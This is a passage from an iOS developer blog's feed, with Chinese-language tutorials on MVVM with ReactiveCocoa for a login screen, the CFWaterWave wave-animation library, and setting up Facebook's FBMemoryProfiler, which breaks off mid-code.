*failureSubject;</div><div class="line"><span class="comment">// 错误信号</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACSubject *errorSubject;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> *  按钮是否可点信号</div><div class="line"> *</div><div class="line"> *  @return</div><div class="line"> */</div><div class="line">- (RACSignal *)validSignal;</div><div class="line"><span class="comment">/**</span></div><div class="line"> *  登陆操作</div><div class="line"> */</div><div class="line">- (<span class="keyword">void</span>)login;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<hr>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">"LoginViewModel.h"</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"User.h"</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">LoginViewModel</span> ()</span></div><div class="line"></div><div class="line"><span class="comment">/** 用户名改变信号 */</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACSignal *userNameSignal;</div><div class="line"><span class="comment">/** 密码改变信号 */</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) RACSignal *passwordSignal;</div><div class="line"><span class="comment">/** 请求数据（模拟） */</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSArray</span> *requestData;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">LoginViewModel</span></span></div><div class="line"></div><div class="line">- (<span class="keyword">instancetype</span>)init &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">self</span> = [<span class="keyword">super</span> init]) &#123;</div><div class="line">        <span class="comment">// RACObserve(self, name):监听某个对象的某个属性,返回的是信号。</span></div><div class="line">        _userNameSignal = RACObserve(<span class="keyword">self</span>, userName);</div><div class="line">        _passwordSignal = RACObserve(<span class="keyword">self</span>, password);</div><div class="line">        _successSubject = [RACSubject subject];</div><div class="line">        _failureSubject = [RACSubject subject];</div><div class="line">        _errorSubject = [RACSubject subject];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">self</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> *  按钮是否可点信息</div><div class="line"> *</div><div class="line"> *  @return</div><div class="line"> */</div><div class="line">- (RACSignal *)validSignal &#123;</div><div class="line">    RACSignal *validSignal = [RACSignal combineLatest:@[_userNameSignal, _passwordSignal] reduce:^<span class="keyword">id</span>(<span class="built_in">NSString</span> *userName, <span class="built_in">NSString</span> *password)&#123;</div><div class="line">        <span class="comment">// 要求用户名和密码大于6位数</span></div><div class="line">        <span class="keyword">return</span> @(userName.length &gt;= <span class="number">6</span> &amp;&amp; password.length &gt;= <span class="number">6</span>);</div><div class="line">    &#125;];</div><div class="line">    <span class="keyword">return</span> validSignal;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> *  登陆操作</div><div class="line"> */</div><div class="line">- (<span class="keyword">void</span>)login&#123;</div><div class="line">    <span class="comment">// 网络请求进行登录，当然这里只是模拟一下</span></div><div class="line">    User *user = [[User alloc] init];</div><div class="line">    user.username = <span class="keyword">self</span>.userName;</div><div class="line">    user.password = <span class="keyword">self</span>.password;</div><div class="line">    _requestData = @[user];</div><div class="line">    <span class="comment">// 成功发送成功的信号</span></div><div class="line">    [_successSubject sendNext:_requestData];</div><div class="line">    <span class="comment">// 如果失败发送失败的信息号</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<p>通过这一层，你是否发现，VM是可以单独测试的，也是可以单独编写的，即使你没有写 <code>View</code> 层，你可以编写针对VM的Unit进行功能测试，确保VM无误后继续编写后续代码。</p>
<h3 id="V层"><a href="#V层" class="headerlink" title="V层"></a>V层</h3><p>首先我们要通过RAC实现一部分UI的功能——输入文字的时候同步将文字保存起来&amp;&amp;控制按钮的禁用状态。</p>
<p>想想看我们通常是怎么做的？</p>
<ol>
<li>通过实现UITextField的代理</li>
<li>在 <code>- (BOOL)textField:(UITextField *)textField shouldChangeCharactersInRange:(NSRange)range replacementString:(NSString *)string;</code> 方法中获取输入的文字，赋值给username属性和password属性</li>
<li>再判断username和password是否符合要求</li>
<li>再设置按钮的enabled属性</li>
</ol>
<p>是不是看一看就觉得乱糟糟的，按钮的addTarget在一个地方，代理又在一个地方，再加上判断用户名密码合法逻辑单独抽出的方法。OMG。</p>
<p>ReactiveCocoa是怎么做的？</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">RAC(<span class="keyword">self</span>.viewModel, userName) = <span class="keyword">self</span>.tfUserName.rac_textSignal;</div><div class="line">RAC(<span class="keyword">self</span>.viewModel, password) = <span class="keyword">self</span>.tfPassword.rac_textSignal;</div><div class="line">RAC(<span class="keyword">self</span>.btLogin, enabled) = [<span class="keyword">self</span>.viewModel validSignal];</div></pre></td></tr></table></figure>
<p>三句话，清清爽爽。</p>
<p>再加上 <code>ViewModel</code> 的信号绑定，将上面的代码放到一个方法中，命名为<code>bindModel</code></p>
<p>最后的代码如下：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">"ViewController.h"</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"ReactiveCocoa.h"</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"LoginViewModel.h"</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"User.h"</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">ViewController</span> ()</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) LoginViewModel *viewModel;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">weak</span>, <span class="keyword">nonatomic</span>  ) <span class="keyword">IBOutlet</span> <span class="built_in">UITextField</span>    *tfUserName;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">weak</span>, <span class="keyword">nonatomic</span>  ) <span class="keyword">IBOutlet</span> <span class="built_in">UITextField</span>    *tfPassword;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">weak</span>, <span class="keyword">nonatomic</span>  ) <span class="keyword">IBOutlet</span> <span class="built_in">UIButton</span>       *btLogin;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">ViewController</span></span></div><div class="line"></div><div class="line">- (<span class="keyword">void</span>)viewDidLoad &#123;</div><div class="line">    [<span class="keyword">super</span> viewDidLoad];</div><div class="line">    [<span class="keyword">self</span> bindModel];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> *  绑定Model中的各种事件</div><div class="line"> */</div><div class="line">- (<span class="keyword">void</span>)bindModel &#123;</div><div class="line">    <span class="keyword">self</span>.viewModel = [[LoginViewModel alloc] init];</div><div class="line">    RAC(<span class="keyword">self</span>.viewModel, userName) = <span class="keyword">self</span>.tfUserName.rac_textSignal;</div><div class="line">    RAC(<span class="keyword">self</span>.viewModel, password) = <span class="keyword">self</span>.tfPassword.rac_textSignal;</div><div class="line">    RAC(<span class="keyword">self</span>.btLogin, enabled) = [<span class="keyword">self</span>.viewModel validSignal];</div><div class="line">    </div><div class="line"><span class="comment">//    @weakify(self);</span></div><div class="line">    <span class="comment">// 订阅登录成功信号并作出处理</span></div><div class="line">    [<span class="keyword">self</span>.viewModel.successSubject subscribeNext:^(<span class="built_in">NSArray</span> * x) &#123;</div><div class="line"><span class="comment">//        @strongify(self);</span></div><div class="line">        User *user = x[<span class="number">0</span>];</div><div class="line">        <span class="built_in">NSLog</span>(<span class="string">@"username:%@\tpassword:%@"</span>, user.username, user.password);</div><div class="line">        <span class="built_in">NSLog</span>(<span class="string">@"登陆成功"</span>);</div><div class="line">    &#125;];</div><div class="line">    </div><div class="line">    <span class="comment">// 订阅登录失败信号并作出处理</span></div><div class="line">    [<span class="keyword">self</span>.viewModel.failureSubject subscribeNext:^(<span class="keyword">id</span> x) &#123;</div><div class="line">        <span class="built_in">NSLog</span>(<span class="string">@"登陆失败"</span>);</div><div class="line">    &#125;];</div><div class="line">    </div><div class="line">    <span class="comment">// 订阅登录错误信号并作出处理</span></div><div class="line">    [<span class="keyword">self</span>.viewModel.errorSubject subscribeNext:^(<span class="keyword">id</span> x) &#123;</div><div class="line">        <span class="built_in">NSLog</span>(<span class="string">@"登陆错误"</span>);</div><div class="line">    &#125;];</div><div class="line">    </div><div class="line">    <span class="comment">// 添加按钮点击事件</span></div><div class="line">    [[<span class="keyword">self</span>.btLogin rac_signalForControlEvents:<span class="built_in">UIControlEventTouchUpInside</span>] subscribeNext:^(<span class="keyword">id</span> x) &#123;</div><div class="line">        [<span class="keyword">self</span>.viewModel login];</div><div class="line">    &#125;];</div><div class="line">    </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<p>这样，ViewController中事件处理的所有代码被集中在一起，方便管理，你的代码变得如此清爽、低耦合。</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>以上代码地址请点<a href="http://download.csdn.net/detail/u010127917/9528911" target="_blank" rel="external">这里</a>。</p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>小鱼最近在换工作哟~各路的朋友有推荐的请务必介绍我哟~<br>简历在<a href="http://zhoulingyu.com/about/">这里</a></p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#x63;&#111;&#x64;&#x65;&#x72;&#102;&#105;&#115;&#x68;&#x40;&#49;&#54;&#51;&#x2e;&#x63;&#111;&#x6d;">&#x63;&#111;&#x64;&#x65;&#x72;&#102;&#105;&#115;&#x68;&#x40;&#49;&#54;&#51;&#x2e;&#x63;&#111;&#x6d;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-MVVM简介&quot;&gt;&lt;a href=&quot;#1-MVVM简介&quot; class=&quot;headerlink&quot; title=&quot;1. MVVM简介&quot;&gt;&lt;/a&gt;1. MVVM简介&lt;/h1&gt;&lt;p&gt;不过多赘述MVC，用最通俗的方式解说MVVM。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;拆解：&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;M：&lt;/strong&gt; &lt;code&gt;Model&lt;/code&gt; ，包括数据模型、访问数据库的操作和网络请求等&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;V：&lt;/strong&gt; &lt;code&gt;View&lt;/code&gt; ，包括了iOS中的 &lt;code&gt;View&lt;/code&gt; 和 &lt;code&gt;controller&lt;/code&gt; 组成，负责 UI 的展示，绑定 viewModel 中的属性&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;VM：&lt;/strong&gt; &lt;code&gt;ViewModel&lt;/code&gt; ，负责从 &lt;code&gt;Model&lt;/code&gt; 中获取 &lt;code&gt;View&lt;/code&gt; 所需的数据，转换成 &lt;code&gt;View&lt;/code&gt; 可以展示的数据，并暴露公开的属性和命令供 &lt;code&gt;View&lt;/code&gt; 进行绑定&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Binder：&lt;/strong&gt;这是我最近发现的，在标准MVVM中没有提到的一部分，但是如果使用MVVM + ReactiveCocoa就会自然地写出这一层。这一层主要为了实现响应式编程的功能，实现 &lt;code&gt;View&lt;/code&gt; 和  &lt;code&gt;ViewModel&lt;/code&gt; 的同步&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>iOS——CFWaterWave水波效果工具</title>
    <link href="http://zhoulingyu.com/2016/04/28/iOS%E2%80%94%E2%80%94CFWaterWave%E6%B0%B4%E6%B3%A2%E6%95%88%E6%9E%9C%E5%B7%A5%E5%85%B7/"/>
    <id>http://zhoulingyu.com/2016/04/28/iOS——CFWaterWave水波效果工具/</id>
    <published>2016-04-28T08:53:37.000Z</published>
    <updated>2016-08-05T06:22:21.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="最近通过前辈，学着做了一个水波效果工具共享出来，github连接"><a href="#最近通过前辈，学着做了一个水波效果工具共享出来，github连接" class="headerlink" title="最近通过前辈，学着做了一个水波效果工具共享出来，github连接"></a>最近通过前辈，学着做了一个水波效果工具共享出来，<a href="https://github.com/summertian4/CFWaterWave" target="_blank" rel="external">github连接</a></h3><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>CFWaterWave是一个简单好用的iOS水波效果工具，可以让你的APP更加好看有趣</p>
<p><img src="http://7xt4xp.com2.z0.glb.clouddn.com/github_CFWaterWave_show_01.gif" alt="CFWaterWave效果展示"></p>
<a id="more"></a>
<h1 id="原理简介"><a href="#原理简介" class="headerlink" title="原理简介"></a>原理简介</h1><p>CFWaterWave的原理很简单，我们用Example里的工程做简介。(这里首先要感谢@hy，我敬爱的前辈，最初是从他这里学习的水波效果原理)</p>
<p><img src="http://7xt4xp.com2.z0.glb.clouddn.com/github_CFWaterWave_pic_white.png-w100" alt="白色图片"><br><img src="http://7xt4xp.com2.z0.glb.clouddn.com/github_CFWaterWave_pic_red.png-w100" alt="红色图片"><br><img src="http://7xt4xp.com2.z0.glb.clouddn.com/github_CFWaterWave_img_03.png-w100" alt="叠加添加遮盖效果"></p>
<ol>
<li>首先准备两张图片</li>
<li>将两张图放在重叠的位置</li>
<li>将其中一张图片加上波浪形的遮盖</li>
<li>如果波浪形的遮盖是动态再变化的的，就可以形成动态的波浪</li>
<li>CFWaterWave就是为你提供好了动态波浪的Path，你只需要在回调中加入遮盖即可</li>
<li>如果你还是晕晕的，那就直接看Example吧，相信你瞬间就会明白的</li>
</ol>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>直接拽入<code>CFWaterWave.h</code>和<code>CFWaterWave.m</code>文件</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><ol>
<li>创建CFWaterWave对象</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">- (<span class="built_in">CFWaterWave</span> *)waterWave &#123;</div><div class="line">    <span class="keyword">if</span> (_waterWave == <span class="literal">nil</span>) &#123;</div><div class="line">        <span class="comment">// 给定的frame和你的图片frame一致即可</span></div><div class="line">        _waterWave = [[<span class="built_in">CFWaterWave</span> alloc] initWithFrame:<span class="keyword">self</span>.pic_red.frame];</div><div class="line">        _waterWave.delegate = <span class="keyword">self</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> _waterWave;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ol>
<li>实现好代理，在代理中给你想要实现水波纹的图片加上贝塞尔路径生成的遮盖</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)waterWave:(<span class="built_in">CFWaterWave</span> *)waterWave wavePath:(<span class="built_in">UIBezierPath</span> *)path &#123;</div><div class="line">    <span class="built_in">CAShapeLayer</span> *maskLayer = [[<span class="built_in">CAShapeLayer</span> alloc] init];</div><div class="line">    maskLayer.path = path.CGPath;</div><div class="line">    <span class="comment">// 添加遮盖</span></div><div class="line">    <span class="keyword">self</span>.pic_red.layer.mask = maskLayer;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="用例"><a href="#用例" class="headerlink" title="用例"></a>用例</h1><ol>
<li>Exmaple中的示例</li>
</ol>
<p><img src="http://7xt4xp.com2.z0.glb.clouddn.com/github_CFWaterWave_show_01.gif" alt="CFWaterWave效果展示"></p>
<ol>
<li>最近做的一个小APP——『番茄』的效果展示（如果有感兴趣的，可以联系我一起合作写哟~，因为这小项目，我想静静的体验一下当设计师的感觉😜）</li>
</ol>
<p><img src="http://7xt4xp.com2.z0.glb.clouddn.com/github_CFWaterWave_show_02.gif" alt="CFWaterWave效果展示"></p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>约定好的奉上自拍哈哈</p>
<p><img src="http://7xt4xp.com2.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94CFWaterWave%E6%B0%B4%E6%B3%A2%E6%95%88%E6%9E%9C%E5%B7%A5%E5%85%B7-01.JPG-w375" alt=""></p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#x63;&#111;&#100;&#x65;&#x72;&#102;&#105;&#x73;&#x68;&#64;&#x31;&#x36;&#x33;&#x2e;&#99;&#x6f;&#x6d;">&#x63;&#111;&#100;&#x65;&#x72;&#102;&#105;&#x73;&#x68;&#64;&#x31;&#x36;&#x33;&#x2e;&#99;&#x6f;&#x6d;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;最近通过前辈，学着做了一个水波效果工具共享出来，github连接&quot;&gt;&lt;a href=&quot;#最近通过前辈，学着做了一个水波效果工具共享出来，github连接&quot; class=&quot;headerlink&quot; title=&quot;最近通过前辈，学着做了一个水波效果工具共享出来，github连接&quot;&gt;&lt;/a&gt;最近通过前辈，学着做了一个水波效果工具共享出来，&lt;a href=&quot;https://github.com/summertian4/CFWaterWave&quot;&gt;github连接&lt;/a&gt;&lt;/h3&gt;&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;CFWaterWave是一个简单好用的iOS水波效果工具，可以让你的APP更加好看有趣&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xt4xp.com2.z0.glb.clouddn.com/github_CFWaterWave_show_01.gif&quot; alt=&quot;CFWaterWave效果展示&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>iOS——抢鲜来体验一下FBMemoryProfiler</title>
    <link href="http://zhoulingyu.com/2016/04/21/iOS%E2%80%94%E2%80%94%E6%8A%A2%E9%B2%9C%E6%9D%A5%E4%BD%93%E9%AA%8C%E4%B8%80%E4%B8%8BFBMemoryProfiler/"/>
    <id>http://zhoulingyu.com/2016/04/21/iOS——抢鲜来体验一下FBMemoryProfiler/</id>
    <published>2016-04-21T13:32:31.000Z</published>
    <updated>2016-08-05T06:22:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FBMemoryProfiler简介"><a href="#FBMemoryProfiler简介" class="headerlink" title="FBMemoryProfiler简介"></a>FBMemoryProfiler简介</h1><ol>
<li>4月刚刚推出的新品~保证中你口味</li>
<li>FaceBook荣誉出品~</li>
<li>作者<a href="https://github.com/Gricha" target="_blank" rel="external">Gricha</a></li>
<li>功能及前身：也许你用过<a href="https://github.com/facebook/FBRetainCycleDetector" target="_blank" rel="external">FBRetainCycleDetector</a>，这就是<a href="https://github.com/facebook/FBMemoryProfiler" target="_blank" rel="external">FBMemoryProfiler</a>的前身了，是由Gricha编写用来检测循环引用的小工具。FBMemoryProfiler比FBRetainCycleDetector要强大的多，提供了非常帮的<code>交互界面</code>和更多的功能。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/facebook/FBMemoryProfiler/master/Example/Images/Example2.gif" alt="FBMemoryProfiler一览"></p>
<a id="more"></a>
<h1 id="初上手"><a href="#初上手" class="headerlink" title="初上手"></a>初上手</h1><ol>
<li><p><strong>pod安装</strong></p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pod 'FBMemoryProfiler'</div></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><p><strong>enable FBAllocationTracker:</strong></p>
<p> 在<code>mian.m</code>文件中（注意是<code>main.m</code>，不是AppDelegate.m）中加入：</p>
 <figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;FBAllocationTracker/FBAllocationTrackerManager.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[]) &#123;</div><div class="line"> 	[[FBAllocationTrackerManager sharedManager] startTrackingAllocations];</div><div class="line"> 	[[FBAllocationTrackerManager sharedManager] enableGenerations];</div><div class="line"> 	<span class="keyword">@autoreleasepool</span> &#123;</div><div class="line">   	  <span class="keyword">return</span> <span class="built_in">UIApplicationMain</span>(argc, argv, <span class="literal">nil</span>, <span class="built_in">NSStringFromClass</span>([AppDelegate <span class="keyword">class</span>]));</div><div class="line"> 	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><p><strong>enable FBMemoryProfiler</strong>:</p>
<p> 这次是去<code>AppDelegate.m</code>了，去加一个变量，保证MemoryProfiler不会被释放：</p>
 <figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span> , <span class="keyword">strong</span>) FBMemoryProfiler * memoryProfiler;</div></pre></td></tr></table></figure>
</li>
</ol>
<pre><code>在`didFinishLaunchingWithOptions`方法中添加：

<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">self</span>.memoryProfiler = [FBMemoryProfiler new];</div><div class="line">                              retainCycleDetectorConfiguration:<span class="literal">nil</span>];</div><div class="line">[<span class="keyword">self</span>.memoryProfiler enable];</div></pre></td></tr></table></figure>
</code></pre><ol>
<li><p>试一试，运行你的APP是不是能看到小方块了</p>
<p> <img src="http://7xt4xp.com2.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%8A%A2%E9%B2%9C%E6%9D%A5%E4%BD%93%E9%AA%8C%E4%B8%80%E4%B8%8BFBMemoryProfiler-01.PNG-w375" alt="初始样式"><br> <img src="http://7xt4xp.com2.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%8A%A2%E9%B2%9C%E6%9D%A5%E4%BD%93%E9%AA%8C%E4%B8%80%E4%B8%8BFBMemoryProfiler-02.PNG-w375" alt="展开"></p>
</li>
<li><p>展开后点击Expand，可以看到所有的类，你可以通过<code>Filter</code>过滤你想看到的结果，比如你的项目是CF开头，就可以输入CF来过滤</p>
<p> <img src="http://7xt4xp.com2.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%8A%A2%E9%B2%9C%E6%9D%A5%E4%BD%93%E9%AA%8C%E4%B8%80%E4%B8%8BFBMemoryProfiler-03.JPG-w375" alt=""></p>
</li>
<li><p>还有很多功能，去尝试吧！</p>
</li>
</ol>
<h1 id="添加自己的pulgin"><a href="#添加自己的pulgin" class="headerlink" title="添加自己的pulgin"></a>添加自己的pulgin</h1><p>除了基本功能，FBMemoryProfiler还提供了接口扩展功能</p>
<h2 id="1-FBMemoryProfilerPluggable"><a href="#1-FBMemoryProfilerPluggable" class="headerlink" title="1. FBMemoryProfilerPluggable"></a>1. FBMemoryProfilerPluggable</h2><p>你可以阅读<code>FBMemoryProfilerPluggable.h</code><br>FBMemoryProfilerPluggable是一个协议，你可以通过实现这个协议来扩展你想要的功能<br>提供了如下方法：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">@protocol</span> <span class="title">FBMemoryProfilerPluggable</span> &lt;<span class="title">NSObject</span>&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">@optional</span></div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> Lifecycle events, when Memory profiler is enabled/disabled</div><div class="line"> */</div><div class="line">- (<span class="keyword">void</span>)memoryProfilerDidEnable;</div><div class="line">- (<span class="keyword">void</span>)memoryProfilerDidDisable;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> When memory profiler finds retain cycles plugins can subscribe to get them.</div><div class="line"> */</div><div class="line">- (<span class="keyword">void</span>)memoryProfilerDidFindRetainCycles:(<span class="keyword">nonnull</span> <span class="built_in">NSSet</span> *)retainCycles;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> If you want to do additional cleanup after marking new generations.</div><div class="line"> */</div><div class="line">- (<span class="keyword">void</span>)memoryProfilerDidMarkNewGeneration;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<h2 id="2-实现FBMemoryProfilerPluggable协议"><a href="#2-实现FBMemoryProfilerPluggable协议" class="headerlink" title="2. 实现FBMemoryProfilerPluggable协议"></a>2. 实现FBMemoryProfilerPluggable协议</h2><p>来看看<code>Example</code>中提供简单的插件</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * Copyright (c) 2016-present, Facebook, Inc.</div><div class="line"> * All rights reserved.</div><div class="line"> *</div><div class="line"> * This source code is licensed under the license found in the LICENSE file in</div><div class="line"> * the root directory of this source tree.</div><div class="line"> */</div><div class="line"></div><div class="line"><span class="meta">#import <span 